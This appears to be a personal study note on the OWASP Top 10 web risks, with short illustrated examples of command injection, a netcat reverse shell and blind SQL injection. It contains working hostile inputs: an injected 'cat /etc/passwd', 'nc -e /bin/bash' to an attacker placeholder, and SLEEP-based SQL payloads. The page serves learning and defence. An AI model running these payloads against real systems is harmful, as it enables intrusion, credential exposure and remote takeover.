# OWASP vulnerabilities & Hacking techniques

Source: https://app.notion.com/p/2b8fc75cbbd98057a614f50403fd35c9?pvs=204

<b>OWASP</b>, or <b>Open Web Application Security Project</b>, is an online community specialized in web application security.

<b>OWASP top 10</b> are the top attacks used against web applications. It is a free document outlining attacks that are especially conceived for the web and that target the public facing applications mainly. The OWASP standard of top web security risks includes the following attacks or vulnerabilities (the official link here: https://owasp.org/www-project-top-ten/)

<p />

The 2021 list introduces updated categories of common security risks.

<ul>
<li>
<b>Broken Access Control:</b> Covers issues that let attackers access data or functions they shouldn’t, or escalate their privileges. 
</li>
<li>
<b>Cryptographic Failures:</b> Previously known as sensitive data exposure. Includes storing or transmitting credentials in clear text, leaking personal data, or relying on weak encryption.
</li>
<li>
<b>Injection:</b> Occurs when user input isn’t properly validated, allowing attackers to run arbitrary commands or queries (RCE). SQL injection remains the most common, but others exist such as XSS and LDAP injection.
</li>
<li>
<b>Insecure Design:</b> A new category highlighting the need for security considerations during design, such as <b>threat modeling</b>. Examples include weak password-recovery mechanisms like security questions.
</li>
<li>
<b>Security Misconfiguration:</b> is about the security problems that are caused by human error or by negligence. Default passwords, poor error handling, extra services.
</li>
<li>
<b>Vulnerable/Outdated Components:</b> Unpatched, unsupported, or unmonitored software.
</li>
<li>
<b>Identification & Authentication Failures:</b> Weak/default credentials, exposed sessions; brute force, hijacking, account takeover.

- <b>Weak credentials:</b> Users or systems use easy-to-guess passwords.
- <b>Default passwords:</b> Systems shipped with default usernames/passwords that are not changed.
- <b>Exposed session details:</b> Information like session IDs or tokens can be intercepted or guessed.
- <b>Session hijacking:</b> Attacker steals a session ID to impersonate a user.
- <b>Brute forcing:</b> Attacker tries many password combinations until one works.
- <b>Account takeover:</b> Attacker gains full control of someone’s account.
</li>
<li>
<b>Software & Data Integrity Failures:</b>  which happen when software is downloaded and is not checked to verify its integrity using digital signatures. 
</li>
<li>
<b>Logging & Monitoring Failures:</b> happen when an application or system does not properly record or monitor events that could indicate security issues. This makes it hard to detect, investigate, or respond to attacks.

- <b>Incomplete logs:</b> Some important actions (e.g., failed logins, privilege changes) aren’t recorded.
- <b>Alterable logs:</b> Attackers can modify or delete logs to hide their activities. (modification of logs can be by injection if user can reach to log server or files’ paths that stores the logs ons erver)
- <b>Remote logging:</b> Logs should be sent to a secure, centralized location so they cannot be tampered with locally.
</li>
<li>
<b>SSRF:</b> server-side request forgery, as defined by OWASP, as whenever a web application is fetching a remote resource without validating the user-supplied URL.
</li>
</ul>

<p />

<b>Threat modeling</b> is a structured way to identify and evaluate potential security risks in a system before they happen. It focuses on understanding <b>what you’re building</b>, <b>what could go wrong</b>, and <b>how to prevent it</b>.<br />

## Injection Example using PING :

<p />

<image source="notion-file-block://2b8fc75c-bbd9-80b3-bbab-cc4d14b3d270/5255cce4-1ab8-48d5-9e6e-f75b707c161d?space_id=4a3fc75c-bbd9-811b-84e1-0003c414a40d&name=image.png" />

demonstrates a <b>command injection vulnerability</b> in a web application.

1. <b>User Input (Red Box 1):</b>
   <p>
   The user enters <code>127.0.0.1 ; cat /etc/passwd</code> into an IP address field.
   </p>

   - Normally, this field should only accept an IP address.
   - The <code>;</code> allows the attacker to append another command (<code>cat /etc/passwd</code>) that the server executes.
2. <b>Ping Output (Red Box 2):</b>
   <p>
   The application executes the ping to <code>127.0.0.1</code> as intended. This confirms that the server is running the command.
   </p>
3. <b>Command Injection Result (Red Box 3-5):</b>
   <p>
   The additional command <code>cat /etc/passwd</code> outputs the system's <b>password file</b>, revealing user accounts:
   </p>

   - <b>Box 3:</b> Shows the <code>root</code> account and its shell (<code>/bin/bash</code>).
   - <b>Box 4:</b> Shows other user accounts like <code>backup</code> with home directories and shells.
   - <b>Box 5:</b> Shows system accounts such as <code>gnats</code> with their paths and shells.

<b>Key Points:</b>

- The attacker executed arbitrary commands because input wasn’t properly validated or sanitized.
- Sensitive system information (<code>/etc/passwd</code>) was exposed.
- This is a classic example of <b>command injection</b>, which can lead to full server compromise if exploited further.

<p>
Also note that <b>reverse shell / remote command execution</b> scenario using <b>netcat (nc) </b>can be done. 
</p>

<code>nc -e /bin/bash <attacker-ip> <port></code>

- Opens a <b>network connection</b> to the attacker’s machine.
- Result: the attacker receives an <b>interactive Bash shell</b> on the victim machine.

In other words, the attacker can:

- Run commands
- Browse files
- Modify the system
- Install malware
- Fully control the host remotely

### Blind SQL Injection

<b>Blind SQL Injection </b>is when the database <b>does not return error messages or query results</b>, so the attacker can’t directly see the output of their injected SQL. Instead, they infer information <b>indirectly</b>, based on how the application behaves.

<b>Boolean-based blind:</b>

Inject a condition that returns TRUE or FALSE and watch how the page changes.

<code>id=5 AND 1=1</code>→ page loads normally

<code>id=5 AND 1=2</code> → page changes

From this, attackers guess the data bit by bit.

<b>Time-based blind:</b>

Use SQL commands like <code>SLEEP(5)</code> to delay responses. If the server pauses, the condition is TRUE; if not, it's FALSE.

<code>id=5 AND IF((SELECT user()='root'), SLEEP(5), 0)</code>

<page url="https://app.notion.com/p/2b8fc75cbbd980cfa623d9fa5c422c52">
XSS (Cross-Site Scripting)
</page>

<p />

<page url="https://app.notion.com/p/2b9fc75cbbd980438159eac02e99af7a">
Authentication schemas (client side)
</page>

<page url="https://app.notion.com/p/2b9fc75cbbd980feb9d1f0bb30a2a606">
CSRF (Cross-Site Request Forgery) 
</page>

<page url="https://app.notion.com/p/2bbfc75cbbd9806f924efe8dc746ec82">
XXE Injection: XML External Entity (XXE)
</page>
